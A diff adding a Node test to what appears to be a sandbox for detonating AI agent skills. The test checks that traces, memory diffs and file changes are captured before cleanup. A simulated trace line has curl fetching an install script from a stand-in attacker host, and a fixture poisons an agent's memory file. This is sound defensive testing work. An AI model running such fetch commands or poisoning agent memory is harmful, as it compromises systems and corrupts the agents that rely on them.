@@ -1,4 +1,6 @@
 import assert from "node:assert/strict";
+import { access, writeFile } from "node:fs/promises";
+import path from "node:path";
 import { test } from "node:test";
 
 import type { DetonationRequest } from "@clawguard/contracts";
@@ -42,6 +44,48 @@ test("runPromptRunner executes prompt steps through the prompt harness", async (
   assert.ok(invocations.every((entry) => entry.command === "node"));
   assert.ok(result.execution.every((entry) => entry.status === "completed"));
   assert.ok(result.execution.every((entry) => entry.command === "node"));
+});
+
+test("runPromptRunner captures traces and diffs before cleanup", async () => {
+  const request: DetonationRequest = {
+    requestId: "request-evidence-capture",
+    snapshot: loadFixtureSnapshot("malicious-memory-poisoning"),
+    prompts: ["Exercise one workflow."],
+    timeoutSeconds: REQUEST_TIMEOUT_SECONDS,
+  };
+  let rootDir = "";
+
+  const result = await runPromptRunner(createStubProvider(), request, {
+    minPrompts: 1,
+    maxPrompts: 1,
+    async commandRunner(_provider, environment) {
+      rootDir = environment.host.rootDir;
+      await writeFile(
+        path.join(environment.host.workspaceDir, ".clawguard", "traces", "prompt-1.trace.1001"),
+        '12:00:00.000000 execve("/usr/bin/curl", ["curl", "https://payloads.evil.example/install.sh"], 0x0) = 0\n',
+        "utf8",
+      );
+      await writeFile(environment.host.memoryFiles.memory, "# MEMORY\n- poisoned\n", "utf8");
+      await writeFile(path.join(environment.host.skillDir, "captured.txt"), "payload\n", "utf8");
+
+      return {
+        exitCode: 0,
+        stdout: "",
+        stderr: "",
+      };
+    },
+  });
+
+  assert.equal(result.stepTraces[0]?.files[0]?.filename, "prompt-1.trace.1001");
+  assert.equal(result.memoryDiffs.some((diff) => diff.changed && diff.currentContent.includes("poisoned")), true);
+  assert.equal(
+    result.fileChanges.some(
+      (change) =>
+        change.path.endsWith("/captured.txt") && change.currentHash?.startsWith("sha256:") === true,
+    ),
+    true,
+  );
+  await assert.rejects(access(rootDir));
 });
 
 test("buildPromptRunnerPlan extracts common staged install commands from setup sections", async () => {
